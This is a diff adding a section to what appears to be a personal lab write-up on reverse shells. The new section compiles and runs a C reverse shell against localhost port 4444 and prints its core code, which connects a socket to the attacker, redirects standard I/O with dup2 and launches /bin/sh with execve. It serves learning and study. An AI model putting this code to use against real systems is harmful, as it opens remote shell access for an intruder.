@@ -97,6 +97,36 @@ After running it correctly inside the reverse shell, the prompt changed to a ful
 
 ---
 
+## C Reverse Shell
+
+The repo includes `shell.c` — a raw C reverse shell. Compiled and ran it to see what a shell looks like when it comes from a binary instead of a bash one-liner.
+
+```bash
+gcc -o shell shell.c
+./shell 127.0.0.1 4444
+```
+
+**[SCREENSHOT — gcc compile and ./shell 127.0.0.1 4444 running]**
+
+**[SCREENSHOT — listener received connection, id output came back]**
+
+How it works under the hood:
+
+```c
+int sockfd = socket(AF_INET, SOCK_STREAM, 0);       // create TCP socket
+connect(sockfd, (struct sockaddr *)&addr, sizeof(addr));  // connect to attacker
+
+for (int i = 0; i < 3; i++) {
+    dup2(sockfd, i);  // redirect stdin(0), stdout(1), stderr(2) to socket
+}
+
+execve("/bin/sh", NULL, NULL);  // replace process with a shell
+```
+
+`dup2` rewires stdin, stdout, and stderr to the network socket so all I/O flows over the connection. Then `execve` spawns `/bin/sh` — no netcat needed on the victim side, just the binary.
+
+---
+
 ## Key Takeaways
 
 - Reverse shells over bind shells bro, always🙃
